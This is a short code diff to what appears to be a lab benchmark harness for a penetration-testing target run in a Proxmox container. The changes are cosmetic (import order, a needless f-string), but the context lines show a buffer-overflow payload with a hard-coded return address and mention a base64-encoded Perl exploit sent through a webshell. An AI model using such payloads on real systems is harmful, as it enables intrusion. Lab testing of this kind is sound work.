@@ -421,7 +421,8 @@ PYEOF
 
 
 def _phase_binary(dry_run: bool) -> dict:
-    import struct as _struct, base64 as _b64
+    import base64 as _b64
+    import struct as _struct
     _bof = b'A' * 136 + _struct.pack('<Q', 0x4006c6)
     _bof_hex = _bof.hex()
     # Perl exploit script (base64-encoded to avoid quoting issues in webshell)
@@ -723,7 +724,7 @@ def _parse() -> argparse.Namespace:
                    help="Start MBPTL LXC via Proxmox MCP before bench, revert after (requires LAB_MBPTL_LXC_VMID)")
     p.add_argument("--snapshot", default="",
                    metavar="NAME",
-                   help=f"Proxmox snapshot to revert to before each run (default: LAB_MBPTL_SNAPSHOT env or 'clean')")
+                   help="Proxmox snapshot to revert to before each run (default: LAB_MBPTL_SNAPSHOT env or 'clean')")
     p.add_argument("--revert-only", action="store_true",
                    help="Just revert the LXC to the clean snapshot and exit — useful for manual reset")
     return p.parse_args()
